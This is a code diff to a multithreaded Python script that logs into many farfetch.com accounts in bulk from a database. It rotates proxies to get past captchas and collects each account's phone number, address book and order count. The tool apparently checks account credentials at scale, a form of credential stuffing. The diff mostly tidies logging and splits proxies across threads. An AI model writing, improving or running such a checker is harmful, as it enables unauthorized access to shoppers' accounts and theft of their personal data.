@@ -1,3 +1,4 @@
+from re import match
 from parts.Browser import Browser
 from parts.GetProxy import GetProxy
 from parts.ArgParser import ArgsParser
@@ -7,6 +8,7 @@ import time
 import requests
 from itertools import cycle
 from threading import Thread
+import math
 
 
 def check(ip, port, username, password, model):
@@ -18,7 +20,7 @@ def check(ip, port, username, password, model):
             try:
                 browser.get('https://www.farfetch.com/ua/useraccount.aspx')
                 browser.find_element_by_id('login-signIn')
-                print('page load - DONE')
+                # print('page load - DONE')
                 try:
                     login_input = browser.find_element_by_id('email-input-login')
                     login_input.send_keys(model.email)
@@ -28,11 +30,9 @@ def check(ip, port, username, password, model):
                     time.sleep(3)
                     checkbox = browser.find_element_by_id('RememberMe')
 
-                    # метод click() приводит к ошибке при нажатии на чекбокс
                     browser.execute_script("arguments[0].click();", checkbox) 
                     time.sleep(3)
 
-                    # поиск по xpath, id или class не подходит
                     login_btn = browser.find_element_by_xpath('/html/body/div[3]/main/section/div[2]/div/div/div[1]/div[1]/div/form/div[7]/button')
                     login_btn.click()
                     time.sleep(3)
@@ -52,7 +52,7 @@ def check(ip, port, username, password, model):
                     headers = {'cookie': cookie_str}
 
                     browser.find_element_by_id('accordion-account')
-                    print('login - DONE')
+                    # print('login - DONE')
                     try:
                         userdetails_request = requests.get('https://www.farfetch.com/ua/ajax/userdetails', headers=headers)
                         userdetails_request_result = userdetails_request.json()
@@ -64,7 +64,7 @@ def check(ip, port, username, password, model):
                             phone = userdetails_request_result['userDetails']['phoneNumber']
                             model_ph_update = model.set_phone(phone)
 
-                        print(f'userdetails - DONE > {str(userdetails_request.status_code)} | {model_ph_update}')
+                        # print(f'userdetails - DONE > {str(userdetails_request.status_code)} | {model_ph_update}')
                         try:
                             adress_request = requests.get('https://www.farfetch.com/ua/addressbook/', headers=headers)
                             adress_request_result = adress_request.json()
@@ -80,21 +80,14 @@ def check(ip, port, username, password, model):
                             else:
                                 model_cn_update = 'country fields not updated'
 
-                            print(f'adressbook - DONE > {str(adress_request.status_code)} | {model_cn_update}; {model_ph_update}')
+                            # print(f'adressbook - DONE > {str(adress_request.status_code)} | {model_cn_update}; {model_ph_update}')
                             try:
                                 orders_request = requests.get('https://www.farfetch.com/ua/orders/', headers=headers)
                                 orders_request_result = orders_request.json()
                                 orders_count = len(orders_request_result['orders'])
 
-                                # в будузем для суммы стоимости всех заказов
-                                # if orders_count != 0:
-                                #     for order in orders_request['orders']:
-                                #         order_path = order['orderNumber']
-                                #         single_orders_request = requests.get('https://www.farfetch.com/ua/ajax/orders/orderDetails/index/' + order_path, headers=headers)
-                                #         single_orders_request_result = single_orders_request.json()
-
                                 model_or_update = model.set_orders(orders_count)
-                                print(f'orders - DONE > {str(orders_request.status_code)} | {model_or_update}')
+                                # print(f'orders - DONE > {str(orders_request.status_code)} | {model_or_update}')
                                 update_status = model.set_status(2)
                                 print(f'= Account {model.email} - {update_status} =')
                                 print('--------------------')
@@ -160,24 +153,33 @@ def check(ip, port, username, password, model):
         return False
 
 
-def main(factor, limit=None):
-    data = OrdersModel.select().where(OrdersModel.status == 1).limit(limit).offset(limit*factor)
+def main(proxy_slice, factor, limit=None):
 
-    proxies = GetProxy.get_list()
-
+    # выборка записей для обработки
+    if factor == 1:
+        data = OrdersModel.select().where(OrdersModel.status == 1).limit(int(limit))
+    else:
+        data = OrdersModel.select().where(OrdersModel.status == 1).limit(int(limit)).offset(int(limit)*factor)
+    
+    # подготовка прокси для цикла
+    proxies = proxy_slice
     proxies_count = len(proxies)
     cycler = cycle(proxies)
     first_proxy = next(cycler)
     curr_proxy = first_proxy
 
+    # начальные данные для цикла
     do_it = True
     loop = 0
     rows_done = 1
     done_with_status_4 = 0
     done_with_status_3_2 = 0
 
+    # цикл обработки записей
     for row in data:
         proxy_elem = curr_proxy
+
+        # проверка возращаемого рузультата
         if do_it is False:
             print(f'THR-{factor}: PROXY RETURNED CAPCHA')
             loop += 1
@@ -189,32 +191,54 @@ def main(factor, limit=None):
                 proxy_elem = first_proxy
             proxy_elem = next(cycler)
             curr_proxy = proxy_elem
+        else:
             done_with_status_3_2 += 1
 
         print(f'THR-{factor}: USING PROXY WITHOUT CAPCHA {rows_done}/{len(data)}')
         print('--------------------')
-        do_it = check(ip=proxy_elem['host'], port=int(proxy_elem['port']), username=None, password=None, model=row)
-        rows_done += 1
 
-    print(f'THR-{factor}: STATUS 4 - {done_with_status_4} | STATUS 3/2 - {done_with_status_3_2}')
+        do_it = check(ip=proxy_elem['host'], port=int(proxy_elem['port']), username=None, password=None, model=row)
+
+        if do_it is False:
+            print(f'THR-{factor}: STATUS - 4')
+        else:
+            print(f'THR-{factor}: STATUS - 3/2')
+        rows_done += 1
+    print('----------------------------------------')
+    print(f'== THR-{factor}: STATUS 4 - {done_with_status_4} | STATUS 3/2 - {done_with_status_3_2} ==')
+    print('----------------------------------------')
 
 
 def with_threads(thread_num, limit=None):
+    
+    # выбор источника прокси
+    # proxies = GetProxy.get_from_url()
+    proxies = GetProxy.get_list()
+    
+    # распределение записей и прокси между тредами
+    how_many_proxy = math.floor(len(proxies)/thread_num)
+    term = how_many_proxy
     thread_list = []
     if limit:
-        rows_for_thread = limit / thread_num
+        rows_for_thread = int(limit / thread_num)
     else:
         all_rows = OrdersModel.select().where(OrdersModel.status == 1)
-        rows_for_thread = len(all_rows) / thread_num
+        rows_for_thread = int(len(all_rows) / thread_num)
 
-    for count in range(thread_num):
-        thread = Thread(target=main, name=f'THREAD {count+1}', args=(count+1, rows_for_thread,))
+    # циклы запуска и остановки тредов 
+    iteration = 0
+    for count in range(0, thread_num):
+        thread = Thread(target=main, name=f'THREAD {count+1}', args=(proxies[iteration:how_many_proxy], count+1, int(rows_for_thread),))
         thread_list.append(thread)
         thread.start()
         print(f'Thread {count+1} started')
+        iteration += term
+        how_many_proxy += term
+
     for thr in thread_list:
         thr.join()    
-        print(f'Thread {count+1} joined')
+        print(f'Thread {thr} joined')
+
 
 if __name__ == '__main__':
     args = ArgsParser.parse()
